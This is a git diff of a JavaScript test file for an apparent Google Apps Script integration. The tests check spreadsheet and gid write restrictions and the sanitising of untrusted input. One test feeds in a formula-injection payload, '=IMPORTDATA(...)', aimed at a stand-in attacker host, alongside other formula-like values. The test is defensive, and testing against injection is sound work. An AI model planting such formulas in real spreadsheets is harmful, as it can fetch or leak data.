@@ -4,7 +4,8 @@ import { readFile } from "node:fs/promises";
 import vm from "node:vm";
 
 const source = await readFile(new URL("../integrations/google-apps-script.gs", import.meta.url), "utf8");
-const databaseSpreadsheetId = "1e2424AmLESZRYQKy7g3Lhcx0LtTDtYRXH2_m03lVIA0";
+const privateDataSpreadsheetId = "1tRZvYsPy0kw9T18oRpRc16BE7OGDzG0o4CobAl-lJ7U";
+const operationsSpreadsheetId = "1e2424AmLESZRYQKy7g3Lhcx0LtTDtYRXH2_m03lVIA0";
 
 function mockSheet(gid, rows) {
   const state = rows.map((row) => [...row]);
@@ -91,17 +92,17 @@ test("Apps Script rejects unauthenticated web requests before any write", () => 
     "Summary of Survey Response", "Survey Response (Unedited)",
     "Summary of Search History", "Save Resource", "Dislike Resource"
   ];
-  const sheet = mockSheet(697062702, [headers]);
+  const sheet = mockSheet(1080069851, [headers]);
   const { context } = appsScriptContext({
-    [databaseSpreadsheetId]: { getSheets() { return [sheet]; } }
+    [privateDataSpreadsheetId]: { getSheets() { return [sheet]; } }
   });
   const request = (webhookSecret) => ({
     postData: {
       contents: JSON.stringify({
         action: "upsert-user",
         webhookSecret,
-        spreadsheetId: databaseSpreadsheetId,
-        sheetGid: "697062702",
+        spreadsheetId: privateDataSpreadsheetId,
+        sheetGid: "1080069851",
         "Unique User ID": "user-unauthorized",
         Email: "unauthorized@example.com"
       })
@@ -131,17 +132,17 @@ test("Apps Script user upsert preserves headers and accepts a trailing-space sur
     "Save Resource",
     "Dislike Resource"
   ];
-  const sheet = mockSheet(697062702, [
+  const sheet = mockSheet(1080069851, [
     headers,
     ["", "person@example.com", "Old name", "old", "", "{}", "[]", "[]", "[]"]
   ]);
   const { context, locks } = appsScriptContext({
-    [databaseSpreadsheetId]: { getSheets() { return [sheet]; } }
+    [privateDataSpreadsheetId]: { getSheets() { return [sheet]; } }
   });
 
   const result = JSON.parse(context.upsertUser_({
-    spreadsheetId: databaseSpreadsheetId,
-    sheetGid: "697062702",
+    spreadsheetId: privateDataSpreadsheetId,
+    sheetGid: "1080069851",
     "Unique User ID": "user-123",
     "Email": "PERSON@example.com",
     "Username": "New name",
@@ -169,13 +170,90 @@ test("Apps Script user upsert preserves headers and accepts a trailing-space sur
   ]);
   assert.deepEqual(locks, { waited: 1, released: 1 });
   assert.throws(
-    () => context.findTargetSheet_("981733839", databaseSpreadsheetId, "697062702"),
+    () => context.findTargetSheet_(
+      "0",
+      privateDataSpreadsheetId,
+      privateDataSpreadsheetId,
+      "1080069851"
+    ),
     /cannot write/
   );
   assert.throws(
-    () => context.findTargetSheet_("697062702", "another-spreadsheet", "697062702"),
-    /configured database spreadsheet/
+    () => context.findTargetSheet_(
+      "1080069851",
+      operationsSpreadsheetId,
+      privateDataSpreadsheetId,
+      "1080069851"
+    ),
+    /cannot write to spreadsheet/
   );
+});
+
+test("Apps Script enforces the action-specific spreadsheet and gid pairs", () => {
+  const userSheet = mockSheet(1080069851, [[
+    "Unique User ID",
+    "Email",
+    "Username",
+    "Password",
+    "Summary of Survey Response",
+    "Survey Response (Unedited)",
+    "Summary of Search History",
+    "Save Resource",
+    "Dislike Resource"
+  ]]);
+  const feedbackSheet = mockSheet(0, [[
+    "Time Stamp",
+    "Unique User ID (N/A if guest)) ",
+    "Email (N/A if guest)",
+    "Username (if applicable)",
+    "Feedback",
+    "Star(1-5)",
+    "Helpful / Nonhelpful"
+  ]]);
+  const errorSheet = mockSheet(1952899933, [["Reason"]]);
+  const userCountSheet = mockSheet(1958570867, [["All Time", "Active Users"]]);
+  const { context } = appsScriptContext({
+    [privateDataSpreadsheetId]: { getSheets() { return [userSheet, feedbackSheet]; } },
+    [operationsSpreadsheetId]: { getSheets() { return [errorSheet, userCountSheet]; } }
+  });
+
+  assert.throws(
+    () => context.upsertUser_({
+      spreadsheetId: operationsSpreadsheetId,
+      sheetGid: "1080069851",
+      "Unique User ID": "wrong-spreadsheet"
+    }),
+    /cannot write to spreadsheet/
+  );
+  assert.throws(
+    () => context.appendFeedback_({
+      spreadsheetId: privateDataSpreadsheetId,
+      sheetGid: "1080069851"
+    }),
+    /cannot write to sheet gid/
+  );
+  assert.throws(
+    () => context.appendResourceError_({
+      spreadsheetId: privateDataSpreadsheetId,
+      sheetGid: "1952899933"
+    }),
+    /cannot write to spreadsheet/
+  );
+  assert.throws(
+    () => context.updateUserCount_({
+      spreadsheetId: operationsSpreadsheetId,
+      sheetGid: "1952899933",
+      metrics: {}
+    }),
+    /cannot write to sheet gid/
+  );
+
+  context.updateUserCount_({
+    spreadsheetId: operationsSpreadsheetId,
+    sheetGid: "1958570867",
+    metrics: { "All Time": 22, "Active Users": 4 }
+  });
+  assert.deepEqual(userCountSheet.state[1], [22, 4]);
 });
 
 test("Apps Script feedback aliases populate the current A:G headers without changing them", () => {
@@ -188,14 +266,14 @@ test("Apps Script feedback aliases populate the current A:G headers without chan
     "Star(1-5)",
     "Helpful / Nonhelpful"
   ];
-  const sheet = mockSheet(981733839, [headers]);
+  const sheet = mockSheet(0, [headers]);
   const { context, locks } = appsScriptContext({
-    [databaseSpreadsheetId]: { getSheets() { return [sheet]; } }
+    [privateDataSpreadsheetId]: { getSheets() { return [sheet]; } }
   });
 
   context.appendFeedback_({
-    spreadsheetId: databaseSpreadsheetId,
-    sheetGid: "981733839",
+    spreadsheetId: privateDataSpreadsheetId,
+    sheetGid: "0",
     "Time Stamp": "2026-07-28T12:00:00.000Z",
     "Unique User ID (if applicable)": "user-456",
     "Email (if applicable)": "person@example.com",
@@ -230,15 +308,15 @@ test("Apps Script safely textifies and caps every untrusted User Data string", (
     "Save Resource",
     "Dislike Resource"
   ];
-  const sheet = mockSheet(697062702, [headers]);
+  const sheet = mockSheet(1080069851, [headers]);
   const { context } = appsScriptContext({
-    [databaseSpreadsheetId]: { getSheets() { return [sheet]; } }
+    [privateDataSpreadsheetId]: { getSheets() { return [sheet]; } }
   });
   const oversizedFormula = `=${"x".repeat(50000)}`;
 
   context.upsertUser_({
-    spreadsheetId: databaseSpreadsheetId,
-    sheetGid: "697062702",
+    spreadsheetId: privateDataSpreadsheetId,
+    sheetGid: "1080069851",
     "Unique User ID": "=IMPORTDATA(\"https://attacker.invalid\")",
     Email: "+person@example.com",
     Username: "-Village User",
@@ -279,15 +357,16 @@ test("Apps Script safely textifies Feedback and Error sheet values and generated
     "Star(1-5)",
     "Helpful / Nonhelpful"
   ];
-  const feedbackSheet = mockSheet(981733839, [feedbackHeaders]);
+  const feedbackSheet = mockSheet(0, [feedbackHeaders]);
   const errorSheet = mockSheet(1952899933, [[]]);
   const { context } = appsScriptContext({
-    [databaseSpreadsheetId]: { getSheets() { return [feedbackSheet, errorSheet]; } }
+    [privateDataSpreadsheetId]: { getSheets() { return [feedbackSheet]; } },
+    [operationsSpreadsheetId]: { getSheets() { return [errorSheet]; } }
   });
 
   context.appendFeedback_({
-    spreadsheetId: databaseSpreadsheetId,
-    sheetGid: "981733839",
+    spreadsheetId: privateDataSpreadsheetId,
+    sheetGid: "0",
     "Time Stamp": "=NOW()",
     "Unique User ID (if applicable)": "+user-456",
     "Email (if applicable)": "-person@example.com",
@@ -297,7 +376,7 @@ test("Apps Script safely textifies Feedback and Error sheet values and generated
     "Helpful / Nonhelpful": ""
   });
   context.appendResourceError_({
-    spreadsheetId: databaseSpreadsheetId,
+    spreadsheetId: operationsSpreadsheetId,
     sheetGid: "1952899933",
     "=Injected Header": `@${"x".repeat(50000)}`
   });
